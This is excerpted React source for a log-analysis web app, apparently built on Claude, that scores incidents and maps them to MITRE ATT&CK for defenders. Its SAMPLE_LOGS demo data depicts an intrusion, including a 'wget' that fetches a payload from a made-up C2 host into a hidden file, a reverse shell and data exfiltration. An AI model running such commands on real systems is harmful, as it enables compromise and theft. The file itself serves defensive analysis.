/**
 * AI Threat Analyzer — Frontend (No Subscription Edition)
 * Pages: LandingPage · AuthPage · Dashboard · NewScanPage · ScanReport · AccountPage
 */
...
const MITRE_TACTICS = [
  ...
  'Priv Escalation','Defense Evasion','Cred Access','Discovery',
  'Lateral Movement','Collection','C2','Exfiltration','Impact',
];

const SAMPLE_LOGS = `2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   count=847
...
2024-01-15 02:19:22 SSH     SUCCESS src=185.220.101.47 user=deploy    dst=10.0.1.5
2024-01-15 02:19:28 PROCESS pid=9934 user=deploy cmd="wget http://malware-c2.ru/stage2.sh -O /tmp/.hidden"
2024-01-15 02:19:28 DNS     QUERY  src=10.0.1.5  query=malware-c2.ru  response=91.108.4.14
2024-01-15 02:19:33 SYSLOG  WARN   msg="Privilege escalation via CVE-2023-0386 — gained root"
2024-01-15 02:19:35 NETWORK dst=91.108.4.14 src=10.0.1.5 port=4444 state=ESTABLISHED msg="Reverse shell"
2024-01-15 02:19:36 FILE    MODIFY path=/etc/crontab change="Added persistence"
2024-01-15 02:20:03 SSH     SUCCESS src=10.0.1.5 dst=10.0.1.12 msg="Lateral movement — stolen key"
2024-01-15 02:21:19 NETWORK dst=91.108.4.14 src=10.0.1.12 port=443 bytes=94732180 msg="90MB exfiltrated"`;
...
function SeverityBadge({ level }) {
  ...
  return (
    <span className={`px-2 py-0.5 rounded text-xs font-mono font-bold border ${SEV_BG[l] || 'bg-gray-800 border-gray-600'} ${SEV_TEXT[l] || 'text-gray-400'}`}>
      {l || 'UNKNOWN'}
    </span>
  );
}
...
function RiskGauge({ score }) {
  ...
  return (
    <div className="flex flex-col items-center gap-1">
      ...
      <span className={`text-xs font-mono font-bold ${SEV_TEXT[label]}`}>{label}</span>
    </div>
  );
}
        ...
        {MITRE_TACTICS.map(tactic => {
          ...
          return (
            <div key={tactic} className="w-20 flex-shrink-0">
              <div className={`text-center text-xs font-bold p-1.5 rounded-t border-b-2 ${hits.length ? 'bg-red-900/60 border-red-500 text-red-300' : 'bg-gray-900 border-gray-700 text-gray-600'}`}
...
function TerminalLoader({ onComplete }) {
  ...
  useEffect(() => {
    if (shown < lines.length) {
      const t = setTimeout(() => setShown(s => s + 1), 280 + Math.random() * 220);
  ...
  return (
    <div className="bg-gray-950 border border-gray-800 rounded-xl p-6 font-mono text-sm space-y-1.5 min-h-56">
      <div className="flex items-center gap-2 mb-4 pb-3 border-b border-gray-800">
        ...
        <span className="text-gray-500 text-xs ml-2">threat-analyzer — analysing</span>
      </div>
...
function LandingPage({ onLogin, onSignup }) {
  const features = [
    ...
    {icon:'🗺️',title:'MITRE ATT&CK v14',desc:'Auto-maps findings to all 14 tactics and 200+ techniques.'},
    {icon:'🎯',title:'IOC Extraction',desc:'IPs, domains, hashes, files — extracted automatically.'},
    ...
    <div className="min-h-screen bg-gray-950 text-white">
      ...
      <nav className="border-b border-gray-800/50 px-6 py-4 flex items-center justify-between sticky top-0 bg-gray-950/95 backdrop-blur z-40">
        ...
        <div className="flex items-center gap-3">
          ...
          <button onClick={onSignup} className="bg-red-600 hover:bg-red-500 text-white text-sm px-5 py-2 rounded-lg font-semibold transition-colors">
            Get Started Free
          </button>
        </div>
      </nav>
      ...
      <section className="relative overflow-hidden px-6 py-28 text-center bg-grid">
        ...
        <div className="relative max-w-3xl mx-auto">
          <div className="inline-flex items-center gap-2 bg-red-900/20 border border-red-800/30 rounded-full px-4 py-1.5 text-red-400 text-sm mb-8 font-mono">
            ...
            Powered by Claude · MITRE ATT&CK v14 · Free to use
          </div>
          ...
          <p className="text-gray-600 text-xs mt-4">No credit card · No subscription · Unlimited scans</p>
        </div>
      </section>
      ...
      <footer className="border-t border-gray-800 px-6 py-8 text-center text-gray-600 text-sm">
        🛡 AI Threat Analyzer — Powered by Claude · © {new Date().getFullYear()}
      </footer>
    </div>
  );
}
  ...
  async function handleSubmit(e) {
    ...
    try {
      ...
      if (mode === 'signup' && !result.data.session) {
        setMsg('Account created! Check your email, then sign in.'); return;
      }
        ...
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            ...
            <input type="email" value={email} onChange={e=>setEmail(e.target.value)} required
              className="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2.5 text-white placeholder-gray-600 focus:border-blue-500 focus:outline-none"
          ...
          {msg && <p className={`text-sm p-3 rounded-lg ${msg.includes('created')?'bg-green-900/30 text-green-400':'bg-red-900/30 text-red-400'}`}>{msg}</p>}
      ...
      <div className="max-w-5xl mx-auto px-6 py-8">
        ...
        <div className="bg-gray-900 border border-gray-800 rounded-xl overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-800 flex items-center justify-between">
            ...
            <button onClick={onNewScan} className="text-red-400 hover:text-red-300 text-sm font-semibold transition-colors">+ New Analysis</button>
          </div>
          {loading ? (
            ...
            <div className="p-12 text-center">
              ...
              <button onClick={onNewScan} className="bg-red-600 hover:bg-red-500 text-white px-6 py-2.5 rounded-xl font-semibold transition-colors">
                Run First Analysis
              </button>
            </div>
          ) : (
            <table className="w-full">
              <thead><tr className="text-xs text-gray-500 border-b border-gray-800">
                ...
                <th className="text-left px-6 py-3">Input Size</th>
              ...
              <tbody>
                {scans.map((scan,i)=>(
                  <tr key={scan.id} className={`border-b border-gray-800/50 hover:bg-gray-800/30 transition-colors ${i%2===0?'':'bg-gray-900/30'}`}>
                    ...
                    <td className="px-6 py-3"><span className={`font-mono font-bold ${SEV_TEXT[scan.severity]||'text-gray-400'}`}>{scan.risk_score}/100</span></td>
                    <td className="px-6 py-3 text-sm text-gray-500 font-mono">{scan.input_size?(scan.input_size/1024).toFixed(1)+' KB':'—'}</td>
...
function NewScanPage({ onComplete, onBack }) {
  ...
  async function handleAnalyse() {
    if (!input.trim() && !file) { setError('Paste log data or upload a file.'); return; }
  ...
  async function handleAnalysisComplete() {
    try {
      ...
      setState('error'); setError(err.message || 'Analysis failed. Please try again.');
    }
  }
          ...
          <div className="space-y-5">
            ...
            <div className="bg-gray-900 border border-gray-800 rounded-xl overflow-hidden">
              ...
              <textarea value={input} onChange={e=>{setInput(e.target.value);setFile(null);}}
                ...
                placeholder="Paste firewall logs, SIEM events, IOC lists, incident notes, network captures…"
                spellCheck={false}/>
            </div>
            ...
            <div className="border-2 border-dashed border-gray-700 rounded-xl p-6 text-center hover:border-gray-500 transition-colors cursor-pointer"
              ...
              {file ? (
                ...
                <>
                  ...
                  <div className="text-gray-400 text-sm">Drop a log file here or <span className="text-blue-400">browse</span></div>
                  <div className="text-gray-600 text-xs mt-1">.txt · .log · .json · .csv · max 5 MB</div>
                </>
              )}
            </div>

            {error && <div className="bg-red-900/20 border border-red-700/40 rounded-xl p-4 text-red-400 text-sm">{error}</div>}
...
function ScanReport({ result, onBack, onNewScan }) {
  ...
  const tabs = ['overview','timeline','mitre','iocs','remediation'];
    ...
    <div className="min-h-screen bg-gray-950">
      ...
      <div className="max-w-6xl mx-auto px-6 py-6">
        ...
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-5 flex items-center gap-5">
            ...
            <div>
              ...
              <div className="text-gray-400 text-sm mt-1">{result.affectedSystems?.length||0} system(s)</div>
            </div>
          </div>
          <div className="md:col-span-2 bg-gray-900 border border-gray-800 rounded-xl p-5">
            ...
            <div className="flex flex-wrap gap-2 mt-3">
              <span className="text-xs bg-gray-800 border border-gray-700 px-2 py-1 rounded-full font-mono">{result.mitreMapping?.length||0} techniques</span>
              <span className="text-xs bg-gray-800 border border-gray-700 px-2 py-1 rounded-full font-mono">{result.iocs?.length||0} IOCs</span>
          ...
          <div className="space-y-4">
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
              ...
              {(result.affectedSystems||[]).map((sys,i)=>(
                <div key={i} className="flex items-center justify-between bg-gray-800/50 rounded-lg px-4 py-2.5 mb-2">
                  <span className="font-mono text-sm">{sys.host}</span>
                  <div className="flex items-center gap-3">
            ...
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
              <h3 className="font-bold mb-3 text-sm text-gray-400 uppercase tracking-wider">MITRE ATT&CK Coverage</h3>
              ...
              {(result.timeline||[]).map((ev,i)=>(
                <div key={i} className="flex gap-4">
                  <div className="flex flex-col items-center">
                    <div className={`w-2.5 h-2.5 rounded-full mt-1.5 flex-shrink-0 ${SEV_TEXT[ev.severity]?.replace('text-','bg-')||'bg-gray-500'}`}/>
                    {i<(result.timeline?.length||0)-1&&<div className="w-0.5 flex-1 bg-gray-800 mt-1"/>}
                  </div>
                  <div className="pb-4 flex-1">
                    <div className="flex items-center gap-3 mb-1">
                      <span className="font-mono text-xs text-gray-500">{ev.time}</span>
                      <SeverityBadge level={ev.severity}/>
                      {ev.tactic&&<span className="text-xs bg-blue-900/30 border border-blue-700/30 text-blue-400 px-2 py-0.5 rounded font-mono">{ev.tactic}</span>}
                    </div>
                    <p className="text-sm text-gray-200">{ev.event}</p>
                  </div>
                </div>
              ))}
            </div>
        ...
        {tab==='iocs' && (
          <div className="bg-gray-900 border border-gray-800 rounded-xl overflow-hidden">
            <table className="w-full">
              <thead><tr className="text-xs text-gray-500 border-b border-gray-800 text-left">
                  ...
                  <div className="flex-1">
                    <div className="flex flex-wrap items-center gap-2 mb-1">
                      <span className={`text-xs font-mono px-2 py-0.5 rounded border ${
                        ...
                        'bg-blue-900/30 border-blue-700/30 text-blue-400'}`}>{step.category}</span>
      ...
      <div className="max-w-lg mx-auto px-6 py-10 space-y-4">
        <div className="bg-gray-900 border border-gray-800 rounded-xl p-6 space-y-3 text-sm">
          ...
          <div className="flex justify-between">
            ...
            <span className="font-mono text-gray-500 text-xs">{user?.id?.substring(0,16)}…</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-500">Plan</span>
            <span className="font-semibold text-green-400">Free · Unlimited Scans</span>
          </div>
        </div>
    ...
    <div className="min-h-screen bg-gray-950 text-white">
      ...
      {page==='dashboard' && user && (
        <Dashboard user={user} onNewScan={()=>setPage('scan')}
          onViewScan={async id=>{
            try{const d=await apiFetch(`/api/scans/${id}`);setScanResult(d.scan.result);setPage('report');}
